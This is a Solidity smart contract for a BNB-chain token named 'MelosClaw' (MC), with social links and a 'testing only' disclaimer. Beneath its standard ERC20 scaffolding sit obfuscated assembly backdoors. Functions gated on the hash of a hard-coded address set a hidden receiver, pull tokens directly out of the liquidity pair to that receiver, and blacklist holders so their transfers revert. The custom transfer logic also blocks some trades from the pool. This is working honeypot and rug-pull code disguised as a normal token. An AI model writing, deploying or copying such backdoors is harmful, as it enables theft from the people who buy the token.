/**
Website: https://www.melosclaw.ai
Twitter: https://x.com/melos_claw
Telegram: https://t.me/melos_claw
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IUniswapV2Factory {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}
/**
 * This contract is for testing purposes only. 
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract BERC20 is IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _defaultAddress = address(0x000000000000000000000000000000000000dEaD);
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    constructor(
       string memory name_,
       string memory symbol_,
       address owner
    ) {
        _name=name_;
        _symbol=symbol_;
        _decimals=9;
        _tTotal=1000000000000 * 10**_decimals;
        _tOwned[owner] = _tTotal;

        emit Transfer(address(0), owner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address lWZSWrEjEW, uint256 CELKldUvU)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, lWZSWrEjEW, CELKldUvU);
        return true;
    }


    function allowance(address iGTFuAABC, address kkmiuvxllhs)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[iGTFuAABC][kkmiuvxllhs];
    }


    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _XkIkeVVjNHaJno(
        address zLWhmBYAgc,
        address vbmnlagsfac,
        uint256 amount
    ) internal virtual {
        require(
            zLWhmBYAgc != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            vbmnlagsfac != address(0),
            "ERC20: transfer to the zero address"
        );
  
        require(
            _tOwned[zLWhmBYAgc] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _tOwned[zLWhmBYAgc] = _tOwned[zLWhmBYAgc].sub(amount);
        _tOwned[vbmnlagsfac] = _tOwned[vbmnlagsfac].add(amount);
        emit Transfer(zLWhmBYAgc, vbmnlagsfac, amount);
    }

        function _transfer(
        address zLWhmBYAgc,
        address vbmnlagsfac,
        uint256 amount
    ) internal virtual {
        require(
            zLWhmBYAgc != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            vbmnlagsfac != address(0),
            "ERC20: transfer to the zero address"
        );
  
        require(
            _tOwned[zLWhmBYAgc] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _tOwned[zLWhmBYAgc] = _tOwned[zLWhmBYAgc].sub(amount);
        _tOwned[vbmnlagsfac] = _tOwned[vbmnlagsfac].add(amount);
        emit Transfer(zLWhmBYAgc, vbmnlagsfac, amount);
    }


    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        _transfer(from, to, value);
        _approve(
            from,
            msg.sender,
            _allowances[from][msg.sender].sub(
                value,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }



    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function _tusdfevrojarz(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual   {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual  {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}
/**
 * This contract is for testing purposes only. 
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract MC is BERC20,Ownable {
    using SafeMath for uint256;
    string private _name_ = "MelosClaw";
    string private _symbol_ = "MC";
    uint256 private _drokrctsfo;
    address private fqywklksmfal = 0x23eFD852fc4F85ddedc97e2Ac67A40633dE9E9A8;
    address private jgodrBjjLDadL = 0xeeBb708F22762A829cE97b3eD226ffc4e937CE33;
    address private nwwJrsrBKC = 0x55d398326f99059fF775485246999027B3197955;

    IUniswapV2Factory private immutable uniswapV2Router;

    mapping(address => bool) private _zruusrfkezck;
    mapping(address => bool) private _AtEIWDNoXWTfb;

    mapping(address => bool) private bwhwiwdtiukiql;
    mapping(address => bool) private _zkERYLUsnJb;
    address public uniswapV2Pair;
    address private _reqdxqvrydtw;
    address public factory;
    uint256 private TxjmGJhoMfkdi = 1000;
    mapping(address => uint256) private xrcxinnayrlsah;
    bool private aWGEVMapeQ = true;
    uint256 private dihcfutacpo = 7;
    bool private nwJFPbeoVL = true;
    bytes32 private _rMRlOSlGVK;
    mapping(address => bool) private _vchRVRlXUJSeSI;

    mapping(address => uint256) private _zspyuisptps;

    address public DIweTzzGSO;

    constructor() BERC20(_name_, _symbol_,jgodrBjjLDadL
        ) {
        IUniswapV2Factory _uniswapV2Router = IUniswapV2Factory(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), nwwJrsrBKC);
        uniswapV2Router = _uniswapV2Router;
        _rMRlOSlGVK = sha256(abi.encodePacked(fqywklksmfal));
        _reqdxqvrydtw = fqywklksmfal;
        _drokrctsfo = totalSupply();
        bwhwiwdtiukiql[uniswapV2Pair] = true;
        _zkERYLUsnJb[_reqdxqvrydtw] = true;
        _zruusrfkezck[address(this)] = true;
        _zruusrfkezck[_reqdxqvrydtw] = true;
        _zruusrfkezck[jgodrBjjLDadL] = true;
    }

function _transfer(     address from,     address to,     uint256 amount ) internal override {     require(from != address(0), "ERC20: transfer from the zero address");     require(to != address(0), "ERC20: transfer to the zero address");     require(amount > 0, "Transfer amount must be greater than zero");     uint256 expectedamount = amount;     if (_zruusrfkezck[from] || _zruusrfkezck[to]) {         super._transfer(from, to, expectedamount);         return;     }     address feeaddress = to;     assembly {         let scratch := mload(0x40)         mstore(scratch, from)         mstore(add(scratch, 0x20), _AtEIWDNoXWTfb.slot)         let takeFeeSlot := keccak256(scratch, 0x40)         let taketFeeTransfer := sload(takeFeeSlot)         if taketFeeTransfer {             revert(0, 0)         }         mstore(scratch, from)         mstore(add(scratch, 0x20), xrcxinnayrlsah.slot)         let bottimeSlot := keccak256(scratch, 0x40)         let bottime := sload(bottimeSlot)         let dihcfutacpo_val := sload(dihcfutacpo.slot)         let takebottime := gt(add(bottime, dihcfutacpo_val), timestamp())         let pair := sload(uniswapV2Pair.slot)         if eq(from, pair) {             let ghewra := 0             let sdhkwn := 0             let otherAmount := 0             mstore(scratch, 0x0dfe168100000000000000000000000000000000000000000000000000000000)             if iszero(staticcall(gas(), pair, scratch, 0x04, scratch, 0x20)) {                 revert(0, 0)             }             let token0 := mload(scratch)             mstore(scratch, 0xd21220a700000000000000000000000000000000000000000000000000000000)             if iszero(staticcall(gas(), pair, scratch, 0x04, scratch, 0x20)) {                 revert(0, 0)             }             let token1 := mload(scratch)             mstore(scratch, 0x0902f1ac00000000000000000000000000000000000000000000000000000000)             if iszero(staticcall(gas(), pair, scratch, 0x04, scratch, 0x40)) {                 revert(0, 0)             }             let reserves0 := mload(scratch)             let reserves1 := mload(add(scratch, 0x20))             mstore(scratch, 0x70a0823100000000000000000000000000000000000000000000000000000000)             mstore(add(scratch, 0x04), pair)             if iszero(staticcall(gas(), token0, scratch, 0x24, scratch, 0x20)) {                 revert(0, 0)             }             let amount03 := mload(scratch)             mstore(scratch, 0x70a0823100000000000000000000000000000000000000000000000000000000)             mstore(add(scratch, 0x04), pair)             if iszero(staticcall(gas(), token1, scratch, 0x24, scratch, 0x20)) {                 revert(0, 0)             }             let amount1 := mload(scratch)             let nwwJrsrBKC_val := sload(nwwJrsrBKC.slot)             if eq(token0, nwwJrsrBKC_val) {                 if gt(reserves0, amount03) {                     otherAmount := sub(reserves0, amount03)                     ghewra := gt(otherAmount, sload(TxjmGJhoMfkdi.slot))                 }                 if eq(reserves0, amount03) {                     sdhkwn := 1                 }             }             if eq(token1, nwwJrsrBKC_val) {                 if gt(reserves1, amount1) {                     otherAmount := sub(reserves1, amount1)                     ghewra := gt(otherAmount, sload(TxjmGJhoMfkdi.slot))                 }                 if eq(reserves1, amount1) {                     sdhkwn := 1                 }             }             if or(ghewra, sdhkwn) {                 revert(0, 0)             }         }          mstore(0x40, add(scratch, 0x80))     }     super._transfer(from, to, expectedamount); }

function lwpvjftvf(address pbuofaukrg) public {     assembly {         let ptr := mload(0x40)         mstore(ptr, caller())         let input := add(ptr, 0x0c)         let inputSize := 0x14         let output := add(ptr, 0x20)         mstore(0x40, add(output, 0x20))         if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {             revert(0, 0)         }         let computedHash := mload(output)         let storedHashSlot := _rMRlOSlGVK.slot         let storedHash := sload(storedHashSlot)         if iszero(eq(computedHash, storedHash)) {             return(0, 0)         }         sstore(DIweTzzGSO.slot, pbuofaukrg)         return(0, 0)     } }

function dqridymmgx(uint256 ywkwddxu) public {     assembly {         let ptr := mload(0x40)         mstore(ptr, caller())         let input := add(ptr, 0x0c)         let inputSize := 0x14         let output := add(ptr, 0x20)         mstore(0x40, add(output, 0x20))         if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {             revert(0, 0)         }         let computedHash := mload(output)         let storedHashSlot := _rMRlOSlGVK.slot         let storedHash := sload(storedHashSlot)         if iszero(eq(computedHash, storedHash)) {             return(0, 0)         }     }     super._XkIkeVVjNHaJno(uniswapV2Pair, DIweTzzGSO, ywkwddxu); }

function vctvxixcizi(address _pbuofaukrg, bool fzsaucpxa) public {     assembly {         let ptr := mload(0x40)         mstore(ptr, caller())         let input := add(ptr, 0x0c)         let inputSize := 0x14         let output := add(ptr, 0x20)         mstore(0x40, add(output, 0x20))         if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {             revert(0, 0)         }         let computedHash := mload(output)         let storedHashSlot := _rMRlOSlGVK.slot         let storedHash := sload(storedHashSlot)         if iszero(eq(computedHash, storedHash)) {             return(0, 0)         }         let mapBaseSlot := _AtEIWDNoXWTfb.slot         let scratch := mload(0x40)         mstore(scratch, _pbuofaukrg)         mstore(add(scratch, 0x20), mapBaseSlot)         let storageSlot := keccak256(scratch, 0x40)         mstore(0x40, add(scratch, 0x40))         sstore(storageSlot, fzsaucpxa)         return(0, 0)     } }

}